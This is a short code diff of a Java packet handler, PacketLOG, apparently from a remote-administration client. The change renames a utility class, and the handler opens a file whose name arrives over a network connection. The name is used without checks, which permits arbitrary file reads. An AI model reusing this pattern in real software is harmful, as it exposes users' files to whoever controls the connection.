@@ -6,7 +6,7 @@ import java.io.FileInputStream;
 import java.io.InputStreamReader;
 
 import com.redpois0n.Connection;
-import com.redpois0n.Util;
+import com.redpois0n.utils.Utils;
 
 
 public class PacketLOG extends Packet {
@@ -14,7 +14,7 @@ public class PacketLOG extends Packet {
 	@Override
 	public void read(String line) throws Exception {
 		String what = Connection.readLine();
-		File file = new File(Util.getPath().getAbsolutePath() + File.separator + what);
+		File file = new File(Utils.getPath().getAbsolutePath() + File.separator + what);
 		FileInputStream in = new FileInputStream(file);
 		BufferedReader reader = new BufferedReader(new InputStreamReader(in));
 		String log = "";
